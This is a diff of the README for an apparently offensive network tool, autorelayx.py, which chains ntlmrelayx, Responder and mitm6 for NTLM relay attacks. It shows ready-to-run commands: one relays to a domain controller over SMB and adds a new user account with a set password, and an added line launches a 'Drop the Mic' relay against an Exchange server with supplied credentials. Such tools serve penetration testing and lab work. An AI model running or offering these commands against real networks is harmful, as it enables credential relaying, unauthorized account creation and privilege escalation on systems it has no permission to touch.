@@ -27,7 +27,12 @@ This will run ntlmrelayx, Responder, and mitm6. It is suggested to use the -d <d
 ## Relaying to single target and running a custom command once successful
 ```python autorelayx.py -t smb://dc01.local -c "net user /add danmcinerney P@ssword123456"```
 
+## Drop the Mic attack
+```python autorelayx.py -dc 1.2.3.4 -u LAB/dan:P@ssw0rd@exchangeServer.lab.local```
+
+## PrivExchange
+
+
 ## To do
 * add support for PrivExchange
-* add support for CVE-2019-1040
 * add tests
